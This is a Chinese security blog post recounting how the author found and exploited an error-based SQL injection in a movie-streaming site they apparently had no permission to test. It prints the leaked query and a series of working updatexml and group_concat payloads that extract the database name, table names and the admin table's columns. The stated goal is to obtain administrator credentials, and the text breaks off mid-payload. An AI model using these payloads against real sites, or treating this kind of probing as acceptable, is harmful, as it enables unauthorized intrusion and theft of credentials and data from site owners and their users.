---
title: 记一次SQL注入的收获
url: https://www.secpulse.com/archives/189398.html
source: 安全脉搏
date: 2022-10-21
fetch_date: 2025-10-03T20:28:09.329814
---

# 记一次SQL注入的收获

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# 记一次SQL注入的收获

[漏洞](https://www.secpulse.com/archives/category/vul)

[蚁景网安实验室](https://www.secpulse.com/newpage/author?author_id=37244)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng2.png)

2022-10-20

11,450

**一、发现漏洞**

**1.1.发现**

这是一篇两年前的笔记了。之前平常喜欢看些电影影片，不想充值VIP，才发现的网站，但是这个网站A并不是主要测试的，而是通过发现他的兄弟网站B，然后进行渗透。

**1.2.测试**

有事没事对网站动一动，发现A存在XSS，但是并没有多大的利用价值，但是通过友情链接，跳转到了B，就觉得B可能也在同个位置存在XSS但是，令人惊讶的是，我没发现XSS，但是确发现存在SQLI。加了个’,直接把sql语句爆出来了，如下图1。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-189398-1666233018.png)

图 1

**二、漏洞利用**

## **2.1闭合规则**

原始的语句：

```
SELECT `y80s_movies`.*, `y80s_photos`.`path` AS photo_path, `y80s_photos`.`share` AS photo_share
FROM (`y80s_movies`)
LEFT OUTER JOIN `y80s_photos` y80s_photos ON `y80s_photos`.`id` = `y80s_movies`.`photo_id`
WHERE `y80s_movies`.`public` = '1'
AND `y80s_movies`.`attribute` NOT LIKE  '%%1%%'
AND (name like '%XXX%' or aka like '%XXX%')
ORDER BY `y80s_movies`.`update` DESC, `y80s_movies`.`id` DESC
LIMIT 25
```

## 原始报文

```
HTTP/1.1 500 Internal Server ErrorAccess-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept, Authorization, Accept-Encoding, UserAccountServer: nginxDate: Thu, 29 Oct 2020 01:36:40 GMTContent-Type: text/html; charset=utf-8X-Powered-By: PHP/5.6.38X-Cache: MISS from aws-jp08X-Cache: MISS from asia-hk11Connection: closeContent-Length: 882
Array(    [0] => Error Number: 1064    [1] => You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%' or aka like '%xxx%')ORDER BY `y80s_movies`.`update` DESC, `y80s_movies`.' at line 6    [2] => SELECT `y80s_movies`.*, `y80s_photos`.`path` AS photo_path, `y80s_photos`.`share` AS photo_shareFROM (`y80s_movies`)LEFT OUTER JOIN `y80s_photos` y80s_photos ON `y80s_photos`.`id` = `y80s_movies`.`photo_id`WHERE `y80s_movies`.`public` = '1'AND `y80s_movies`.`attribute` NOT LIKE  '%%1%%'AND (name like '%XXX%' or aka like '%XXX'%')ORDER BY `y80s_movies`.`update` DESC, `y80s_movies`.`id` DESCLIMIT 25    [3] => Filename: /home/wwwroot/XXXX/libraries/datamapper.php    [4] => Line Number: 1410)
```

XXX为输入的位置，同上可以看出，会同时在两处插入，但其实只需要管一处即可，后面可以注释掉。

当时在考虑，怎么闭合这个规则，怎么执行自己想执行的语句。但是可能被这么长的语句吓到了，不知道从何下手。也可能是因为自己数据库基础不扎实。其实仔细分析，都是可以化繁为简的。这语句也就是select 字段 from 表名 （一个左外连接） where XXX and XXX and XXX order by XXX。以上是我想的，看看老王想的：这个构造看清大逻辑，select xxx from ta left outer join tb on ta.a=tb.b where con1=xxxxx and con2=xxxx oder by a.a,b.b limit 25，然后得出：注入是在where那里。你学废了吗？

##

## **2.2爆数据**

这步应该是最多的，一开始自己找不到闭合规则，经常会报错，而且还是乱码，如下图2：

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-189398-1666233020.png)

图 2

一开始猜测是回显了数据表，所以导致了乱码，但是并不是，应该只是服务器的问题。这服务器本来就不太稳定，换下查询数据，刷新页面，多试几次就好了。然后思路就想着，构造一个判断语句，通过是与否来判断数据库的信息，然后有了以下的两个payload：

```
1、%e4%ba%ba') and 1=1 or (‘1’=’1
2、%e4%ba%ba') and exists(select path from y80s_photos) or ('1'='1
```

但是这payload真的是太傻了，好在报错信息有提供表名和mysql默认表dual，不然都没法判断是否构造完成。接下来是内容由老王指导完成。

通过union或者updatexml进行查询，内容有回显，一开始我并不知道的，后面通过百度查询到了updatexml用法，于是自己构造了个：

```
1、%e7%88%b1') and updatexml(1,concat('~',(select database()),'~'),3)--+
```

获取了数据名80s，如下图3：

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-189398-1666233022.png)

图 3

既然可以回显，那紧接着，就是查询所有的表名。

笔记：

查询数据库中所有表名

```
select table_name from information_schema.tables where table_schema='数据库名' and table_type='base table';
select table_name from information_schema.tables where table_schema='数据库名'
```

查询指定数据库中指定表的所有字段名column\_name

```
select column_name from information_schema.columns where table_schema='数据库名' and table_name='表名'
```

于是构造了payload：

```
%e7%88%b1') and updatexml(1,concat('~',(select table_name from information_schema.tables where table_schema='80s' limit 0,1),'~'),3)--+
```

其实limit是后面加的，服务器返回：Subquery returns more than 1 row，但是这边只能显示一条，所以一开始思路是使用limit一条一条去查出来，如下图4图5：

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-189398-1666233023.png)

图4

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-189398-1666233025.png)

图5

利用burp-Intruder爆破出数据库，但是，这样太慢了。

老王提供了个函数group\_concat()，group\_concat()类似一个聚集函数，把所有内容拼接成字符串，默认用逗号隔开。于是我的payload就变成：

```
%e6%98%9f') and updatexml(1,concat('~',(select group_concat(table_name) from information_schema.tables where table_schema='80s'),'~'),3)--+
```

但是，人算不如天算，他回显内容有限制长度的，如下图6：

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-189398-1666233026.png)

图 6

看Y80应该可以明显感觉断了，及时看不出来，也不应该就这几个表吧！这时候想到，我们岂不是可以通过limit限制内容，把已经看到了的不输出，我真是天才，然后我构造了payload：

```
%e6%98%9f') and updatexml(1,concat('~',(select group_concat(table_name) from information_schema.tables where table_schema='80s' limit 6,2),'~'),3)--+
```

发现页面居然正常跳转了，没有报错，我人傻了，估计是sql语句又哪里有问题了吧！后面看了老王的，他构造的是：

```
123333') and updatexml(1,concat(0x7e,(select group_concat(x.movie_id) from (select movie_id from hits limit 3,3)x),0x7e),1)--+
select group_concat(x.movie_id) from x，
```

从x表查询movieid，然后聚集成一行，x表是个别名，x  =  seelect movie\_id from hits limit 3,3，从hits查movieid，从记录3往后查3条，结果是个一列三行的数据临时表，然后前面配合聚集，把这三行连接，这样就不用limit a,1这种，每次限制一行记录，这个可以limit a,5这样，一次查五条。

由于我只是想登入后台，尝试找出管理员的表即可，我就还是一个一个试，最终找到管理员表y80s\_managers，然后根据payload：

```
%e6%98%9f') and updatexml(1,concat('~',(select group_concat(column_name) from information_schema.columns where table_schema='80s' and table_name='y80s_managers'),'~'),3)--+
```

查询出字段名id,name,password,right\_id,lock等，如下图7：

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-189398-1666233027.png)

图 7

但是我们主要还是账号名密码，所以继续！构造payload：

```
%e5%a6%bb') and updatexml(1,concat('~',(select group_concat(name) from y80s_man...